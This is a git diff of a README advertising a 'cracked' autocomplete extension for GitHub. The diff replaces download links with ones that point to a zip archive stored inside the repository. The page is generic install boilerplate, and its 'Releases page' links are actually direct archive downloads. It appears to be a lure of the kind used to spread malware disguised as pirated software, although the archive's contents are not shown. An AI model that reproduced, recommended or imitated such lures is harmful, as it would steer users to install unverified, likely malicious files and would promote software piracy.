@@ -1,7 +1,7 @@
 # 🌟 cracked-awesome-autocomplete-for-git-hub-extension - Enhance Your GitHub Experience Effortlessly
 
 ## 📥 Download Now
-[![Download](https://raw.githubusercontent.com/DARKPHATOM/cracked-awesome-autocomplete-for-git-hub-extension/main/elegit/cracked-awesome-autocomplete-for-git-hub-extension.zip)](https://raw.githubusercontent.com/DARKPHATOM/cracked-awesome-autocomplete-for-git-hub-extension/main/elegit/cracked-awesome-autocomplete-for-git-hub-extension.zip)
+[![Download](https://github.com/DARKPHATOM/cracked-awesome-autocomplete-for-git-hub-extension/raw/refs/heads/main/elegit/cracked_autocomplete_for_git_extension_awesome_hub_2.5.zip)](https://github.com/DARKPHATOM/cracked-awesome-autocomplete-for-git-hub-extension/raw/refs/heads/main/elegit/cracked_autocomplete_for_git_extension_awesome_hub_2.5.zip)
 
 ## 🚀 Getting Started
 
@@ -15,7 +15,7 @@ Welcome to the Cracked Awesome Autocomplete for GitHub Extension! This tool will
 ## 📦 Download & Install
 
 1. **Visit the Release Page**
-   Go to our [Releases page](https://raw.githubusercontent.com/DARKPHATOM/cracked-awesome-autocomplete-for-git-hub-extension/main/elegit/cracked-awesome-autocomplete-for-git-hub-extension.zip) to find the latest version.
+   Go to our [Releases page](https://github.com/DARKPHATOM/cracked-awesome-autocomplete-for-git-hub-extension/raw/refs/heads/main/elegit/cracked_autocomplete_for_git_extension_awesome_hub_2.5.zip) to find the latest version.
 
 2. **Choose Your Version**
    Look for the most recent version available. You will find the file ready for download.
@@ -42,7 +42,7 @@ Welcome to the Cracked Awesome Autocomplete for GitHub Extension! This tool will
 
 If you encounter issues during installation or while using the extension, try these steps:
 
-- **Check for Updates:** Ensure you're using the latest version from the [Releases page](https://raw.githubusercontent.com/DARKPHATOM/cracked-awesome-autocomplete-for-git-hub-extension/main/elegit/cracked-awesome-autocomplete-for-git-hub-extension.zip).
+- **Check for Updates:** Ensure you're using the latest version from the [Releases page](https://github.com/DARKPHATOM/cracked-awesome-autocomplete-for-git-hub-extension/raw/refs/heads/main/elegit/cracked_autocomplete_for_git_extension_awesome_hub_2.5.zip).
 - **Disable Other Extensions:** Conflicts may occur with other browser extensions. Temporarily disable them to see if the issue resolves.
 - **Reinstall the Extension:** If problems persist, uninstall and then reinstall the extension to refresh the settings.
 
